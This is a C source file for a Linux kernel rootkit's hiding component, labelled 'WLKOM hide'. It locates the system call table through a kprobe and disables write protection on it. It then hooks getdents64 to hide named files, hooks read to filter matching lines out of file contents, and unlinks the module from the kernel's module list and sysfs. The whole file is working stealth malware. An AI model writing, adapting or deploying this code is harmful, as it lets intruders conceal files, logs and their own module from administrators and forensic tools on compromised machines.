#include "hide.h"

#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/version.h>

/* ── kallsyms_lookup_name via kprobe (kernel >= 5.7) ── */

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long *syscall_table = NULL;

static long (*orig_getdents64)(unsigned int fd,
                                struct linux_dirent64 __user *dirent,
                                unsigned int count) = NULL;

static long (*orig_read)(unsigned int fd, char __user *buf,
                          size_t count) = NULL;

/* ── hidden lists ── */

struct hidden_file
{
    char             name[256];
    struct list_head list;
};

struct hidden_line
{
    char             filename[256];
    char             pattern[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_lines);

/* ── write-protect helpers ── */

static void set_addr_rw(unsigned long addr)
{
    unsigned int level;
    pte_t       *pte = lookup_address(addr, &level);

    if (pte)
        pte->pte |= _PAGE_RW;
}

static void set_addr_ro(unsigned long addr)
{
    unsigned int level;
    pte_t       *pte = lookup_address(addr, &level);

    if (pte)
        pte->pte &= ~_PAGE_RW;
}

/* ── hooked getdents64 ── */

static long hooked_getdents64(unsigned int                   fd,
                               struct linux_dirent64 __user *dirent,
                               unsigned int                   count)
{
    long                          ret;
    long                          new_ret;
    struct hidden_file           *hf;
    char                         *buf;
    int                           bpos = 0;
    struct linux_dirent64 __user *real_dirent;

    ret = orig_getdents64(fd, dirent, count);
    if (ret <= 0 || list_empty(&hidden_files))
        return ret;

    /* With CONFIG_ARCH_HAS_SYSCALL_WRAPPER, the kernel passes a pt_regs *
     * in the first argument slot (fd here = that pointer, a kernel address).
     * The real user dirent pointer lives at inner_regs->si. */
    if ((unsigned long)fd > 0xffff000000000000UL)
        real_dirent = (struct linux_dirent64 __user *)
                      ((struct pt_regs *)(unsigned long)fd)->si;
    else
        real_dirent = dirent;

    new_ret = ret;
    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    if (copy_from_user(buf, real_dirent, ret))
    {
        kfree(buf);
        return ret;
    }

    while (bpos < ret)
    {
        struct linux_dirent64 *d      = (struct linux_dirent64 *)(buf + bpos);
        int                    reclen = d->d_reclen;

        if (reclen == 0 || bpos + reclen > ret)
            break;

        list_for_each_entry(hf, &hidden_files, list)
        {
            if (strcmp(d->d_name, hf->name) == 0)
            {
                memmove(buf + bpos, buf + bpos + reclen,
                        ret - bpos - reclen);
                new_ret -= reclen;
                ret     -= reclen;
                goto next;
            }
        }
        bpos += reclen;
    next:;
    }

    (void)copy_to_user(real_dirent, buf, new_ret);
    kfree(buf);
    return new_ret;
}

/* ── hooked read (line filtering) ── */

static long hooked_read(unsigned int fd, char __user *buf, size_t count)
{
    long                ret     = orig_read(fd, buf, count);
    long                new_ret = ret;
    struct hidden_line *hl;
    char               *kbuf;
    char __user        *real_buf;

    if (ret <= 0 || list_empty(&hidden_lines))
        return ret;

    /* Same pt_regs wrapper issue: real buf pointer is at inner_regs->si */
    if ((unsigned long)fd > 0xffff000000000000UL)
        real_buf = (char __user *)
                   ((struct pt_regs *)(unsigned long)fd)->si;
    else
        real_buf = buf;

    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, real_buf, ret))
    {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    list_for_each_entry(hl, &hidden_lines, list)
    {
        char *pos = kbuf;

        while ((pos = strstr(pos, hl->pattern)) != NULL)
        {
            char *line_start = pos;
            char *line_end;
            int   line_len;

            while (line_start > kbuf && *(line_start - 1) != '\n')
                line_start--;
            line_end = strchr(pos, '\n');
            line_end = line_end ? line_end + 1 : kbuf + new_ret;
            line_len = line_end - line_start;
            memmove(line_start, line_end, new_ret - (line_end - kbuf));
            new_ret        -= line_len;
            kbuf[new_ret]   = '\0';
        }
    }

    (void)copy_to_user(real_buf, kbuf, new_ret);
    kfree(kbuf);
    return new_ret;
}

/* ── public API ── */

void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
}

void hide_file(const char *name)
{
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);

    if (!hf)
        return;
    strncpy(hf->name, name, sizeof(hf->name) - 1);
    hf->name[sizeof(hf->name) - 1] = '\0';
    list_add(&hf->list, &hidden_files);
}

void unhide_file(const char *name)
{
    struct hidden_file *hf, *tmp;

    list_for_each_entry_safe(hf, tmp, &hidden_files, list)
    {
        if (strcmp(hf->name, name) == 0)
        {
            list_del(&hf->list);
            kfree(hf);
        }
    }
}

void hide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl = kmalloc(sizeof(*hl), GFP_KERNEL);

    if (!hl)
        return;
    strncpy(hl->filename, filename, sizeof(hl->filename) - 1);
    hl->filename[sizeof(hl->filename) - 1] = '\0';
    strncpy(hl->pattern, pattern, sizeof(hl->pattern) - 1);
    hl->pattern[sizeof(hl->pattern) - 1] = '\0';
    list_add(&hl->list, &hidden_lines);
}

void unhide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl, *tmp;

    list_for_each_entry_safe(hl, tmp, &hidden_lines, list)
    {
        if (strcmp(hl->filename, filename) == 0
            && strcmp(hl->pattern, pattern) == 0)
        {
            list_del(&hl->list);
            kfree(hl);
        }
    }
}

/* ── init / exit ── */

int hide_init(void)
{
    kallsyms_lookup_name_t kallsyms_fn;

    pr_info("WLKOM hide: initializing (syscall table)...\n");

    register_kprobe(&kp);
    kallsyms_fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_fn)
    {
        pr_err("WLKOM hide: failed to find kallsyms_lookup_name\n");
        return -1;
    }

    syscall_table = (unsigned long *)kallsyms_fn("sys_call_table");
    if (!syscall_table)
    {
        pr_err("WLKOM hide: failed to find sys_call_table\n");
        return -1;
    }

    pr_info("WLKOM hide: sys_call_table at %px\n", syscall_table);

    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
    orig_read       = (typeof(orig_read))syscall_table[__NR_read];

    set_addr_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    syscall_table[__NR_read]       = (unsigned long)hooked_read;
    set_addr_ro((unsigned long)syscall_table);

    pr_info("WLKOM hide: syscalls hooked\n");
    return 0;
}

void hide_exit(void)
{
    struct hidden_file *hf, *hf_tmp;
    struct hidden_line *hl, *hl_tmp;

    if (!syscall_table)
        return;

    set_addr_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_read]       = (unsigned long)orig_read;
    set_addr_ro((unsigned long)syscall_table);

    list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list)
    {
        list_del(&hf->list);
        kfree(hf);
    }
    list_for_each_entry_safe(hl, hl_tmp, &hidden_lines, list)
    {
        list_del(&hl->list);
        kfree(hl);
    }

    pr_info("WLKOM hide: exited\n");
}
